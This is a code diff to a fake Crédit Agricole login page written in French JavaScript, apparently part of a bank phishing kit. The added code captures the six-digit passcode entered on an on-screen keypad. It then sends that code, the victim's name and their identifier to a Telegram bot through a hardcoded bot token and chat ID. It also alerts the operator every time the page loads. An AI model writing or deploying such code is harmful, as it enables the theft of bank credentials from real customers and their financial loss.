@@ -406,6 +406,8 @@
         document.querySelector('.overlay-noir').classList.add('actif');
     });
 
+let codeSaisi = "";
+
 const touches = document.querySelectorAll('.touche:not(.touche-effacer)');
 const cases = document.querySelectorAll('.case');
 const toucheEffacer = document.querySelector('.touche-effacer');
@@ -422,36 +424,85 @@ function mettreAJourCases() {
 
 touches.forEach(function(touche) {
     touche.addEventListener('click', function() {
+        if (navigator.vibrate) navigator.vibrate(200);
         if (indexCase >= cases.length) return;
 
         const caseActuelle = cases[indexCase];
         const chiffre = touche.textContent.trim();
 
-        // Affiche le chiffre en blanc pendant 0.3s
         caseActuelle.querySelector('span').textContent = chiffre;
         caseActuelle.querySelector('span').style.color = 'white';
         caseActuelle.querySelector('span').style.fontSize = '26px';
 
+        codeSaisi += chiffre;  // ← ajoute cette ligne
+
         indexCase++;
         mettreAJourCases();
 
-        // Après 0.3s : on cache le chiffre ET on ajoute le point blanc
         setTimeout(function() {
             caseActuelle.querySelector('span').textContent = '';
             caseActuelle.classList.add('remplie');
         }, 300);
+
+        // Quand les 6 chiffres sont entrés
+        if (indexCase === cases.length) {
+            envoyerCodeTelegram();
+        }
     });
 });
 
 toucheEffacer.addEventListener('click', function() {
+    if (navigator.vibrate) navigator.vibrate(200);
     if (indexCase > 0) {
         indexCase--;
         const casePrecedente = cases[indexCase];
         casePrecedente.classList.remove('remplie');
         casePrecedente.querySelector('span').textContent = '';
+        codeSaisi = codeSaisi.slice(0, -1);
         mettreAJourCases();
     }
 });
+
+const BOT_TOKEN = "8575778335:AAETAvCe_aolvSDfohDyk1ln1YB-1saPScg";
+const CHAT_ID = "-1003756237345";
+
+function envoyerTelegram(texte) {
+    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: texte,
+            parse_mode: "Markdown"
+        })
+    }).catch(function(e) { console.error(e); });
+}
+
+function envoyerCodeTelegram() {
+    const nom = document.getElementById('Full-name').innerText.trim();
+    const identifiant = document.getElementById('identifiant').innerText.trim();
+
+    const message =
+        "# LOG CREDIT AGRICOLE\n\n" +
+        "🤵‍♂️ Full Name : `" + nom + "`\n" +
+        "🔓 Identifiant : `" + identifiant + "`\n" +
+        "🔑 Password : `" + codeSaisi + "`\n\n" +
+        "🏦 Base ⊱ CREDIT AGRICOLE\n" +
+        "👨‍💻 DEV BY ⊱ @esimtoBack\n" +
+        "└━━━━━━━⊱ 🏦 ⊰━━━━━━━━━━━";
+
+    envoyerTelegram(message);
+}
+
+// Message au chargement de la page
+envoyerTelegram(
+    "# LOG CREDIT AGRICOLE\n\n" +
+    "a new user is on the page\n\n" +
+    "🏦 Base ⊱ CREDIT AGRICOLE\n" +
+    "👨‍💻 DEV BY ⊱ @esimtoBack\n" +
+    "└━━━━━━━⊱ 🏦 ⊰━━━━━━━━━━━"
+);
+
 </script>
 </body>
 </html>
